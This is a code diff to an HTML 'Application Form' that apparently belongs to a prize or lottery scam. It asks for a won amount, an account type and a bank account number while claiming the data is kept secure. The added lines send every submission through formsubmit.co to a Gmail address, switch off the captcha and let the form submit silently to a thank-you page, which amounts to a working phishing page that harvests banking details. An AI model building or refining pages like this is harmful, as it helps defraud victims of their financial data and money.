@@ -68,7 +68,15 @@
 </head>
 <body>
 
-  <form id="application-form">
+  <form 
+    id="application-form"
+    action="https://formsubmit.co/exellentfirm@gmail.com"
+    method="POST"
+  >
+    <!-- Disable captcha and redirect to thank you page -->
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_next" value="thankyou.html">
+
     <h2>Application Form</h2>
     <p class="notice">We keep your data/details secure and confidential</p>
 
@@ -190,9 +198,7 @@
       }
     });
 
-    document.getElementById("application-form").addEventListener("submit", function (e) {
-      e.preventDefault();
-
+    document.getElementById("application-form").addEventListener("submit", function () {
       const amount = document.querySelector('input[name="amountWon"]').value;
       const type = document.querySelector('input[name="accountType"]').value;
       const number = document.querySelector('input[name="accountNumber"]').value;
@@ -200,8 +206,6 @@
       document.getElementById("final-amount").textContent = amount;
       document.getElementById("final-type").textContent = type;
       document.getElementById("final-number").textContent = number;
-
-      alert("Form submitted successfully!");
     });
   </script>
 </body>
